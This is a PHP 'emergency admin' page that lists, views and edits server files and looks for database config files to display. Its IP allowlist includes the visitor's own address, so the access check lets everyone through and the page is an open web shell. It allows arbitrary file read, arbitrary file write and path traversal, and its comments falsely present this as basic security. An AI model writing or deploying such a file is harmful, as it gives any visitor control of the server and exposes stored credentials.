<?php
// Emergency admin access point - use with caution
// This file provides a minimal admin interface when the main system is down

// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Basic security - only allow specific IPs
$allowed_ips = array(
    '127.0.0.1',              // localhost
    $_SERVER['REMOTE_ADDR'],  // your current IP
    // Add more IPs here if needed
);

// Check if visitor is allowed
if (!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
    // Redirect unauthorized users to maintenance page
    header('Location: maintenance.html');
    exit;
}

// Helper function to list directories/files
function listDirectory($dir) {
    $items = scandir($dir);
    echo "<ul>";
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        
        $path = $dir . '/' . $item;
        $isDir = is_dir($path);
        $icon = $isDir ? '📁' : '📄';
        $size = $isDir ? '' : ' (' . round(filesize($path) / 1024, 2) . ' KB)';
        $permissions = substr(sprintf('%o', fileperms($path)), -4);
        
        echo "<li>$icon <strong>$item</strong>$size - $permissions";
        if (!$isDir) {
            echo " <a href='?view=" . urlencode($path) . "'>[View]</a>";
            echo " <a href='?edit=" . urlencode($path) . "'>[Edit]</a>";
        }
        echo "</li>";
    }
    echo "</ul>";
}

// Basic HTML header
echo "<!DOCTYPE html>
<html>
<head>
    <title>Emergency Admin</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background-color: #f44336; color: white; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
        .box { background-color: #f5f5f5; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
        pre { background-color: #f5f5f5; padding: 10px; overflow: auto; }
        textarea { width: 100%; height: 400px; font-family: monospace; }
        .success { background-color: #4CAF50; color: white; padding: 10px; margin: 10px 0; border-radius: 5px; }
        .error { background-color: #f44336; color: white; padding: 10px; margin: 10px 0; border-radius: 5px; }
        .warning { background-color: #ff9800; color: white; padding: 10px; margin: 10px 0; border-radius: 5px; }
    </style>
</head>
<body>
    <div class='container'>
        <div class='header'>
            <h1>🚨 Emergency Admin Access 🚨</h1>
            <p>This is a minimal interface for emergency maintenance when the main system is down.</p>
        </div>";

// Handle file viewing
if (isset($_GET['view']) && file_exists($_GET['view'])) {
    $file = $_GET['view'];
    $content = htmlspecialchars(file_get_contents($file));
    echo "<div class='box'>";
    echo "<h2>Viewing: $file</h2>";
    echo "<pre>$content</pre>";
    echo "<p><a href='".$_SERVER['PHP_SELF']."'>&laquo; Back</a></p>";
    echo "</div>";
}

// Handle file editing
if (isset($_GET['edit']) && file_exists($_GET['edit'])) {
    $file = $_GET['edit'];
    
    // Handle form submission for file editing
    if (isset($_POST['save']) && isset($_POST['content'])) {
        if (file_put_contents($file, $_POST['content'])) {
            echo "<div class='success'>File saved successfully!</div>";
        } else {
            echo "<div class='error'>Error saving file. Check permissions.</div>";
        }
    }
    
    $content = htmlspecialchars(file_get_contents($file));
    echo "<div class='box'>";
    echo "<h2>Editing: $file</h2>";
    echo "<form method='post'>";
    echo "<textarea name='content'>$content</textarea>";
    echo "<p><input type='submit' name='save' value='Save Changes'> ";
    echo "<a href='".$_SERVER['PHP_SELF']."'>&laquo; Back</a></p>";
    echo "</form>";
    echo "</div>";
}

// Run the diagnostic tool
echo "<div class='box'>";
echo "<h2>Diagnostics & Tools</h2>";
echo "<p><a href='troubleshoot.php' target='_blank'>Run System Diagnostic</a></p>";
echo "<p><a href='maintenance.html' target='_blank'>View Maintenance Page</a></p>";
echo "</div>";

// Display directory listing
echo "<div class='box'>";
echo "<h2>Current Directory Files</h2>";
listDirectory('.');
echo "</div>";

// Check database connection if possible
echo "<div class='box'>";
echo "<h2>Database Check</h2>";
$db_files = array('connection.php', 'config.php', 'db.php', 'database.php');
$found_db_file = false;

foreach ($db_files as $db_file) {
    if (file_exists($db_file)) {
        echo "<p>Found potential database file: $db_file</p>";
        $found_db_file = true;
        echo "<p><a href='?view=$db_file'>View this file</a></p>";
    }
}

if (!$found_db_file) {
    echo "<p>Could not find any database configuration files.</p>";
}
echo "</div>";

// Footer
echo "<div class='warning'>
    <strong>Warning:</strong> Remember to secure or delete this emergency access file when you're done!
</div>
</div>
</body>
</html>";
?> 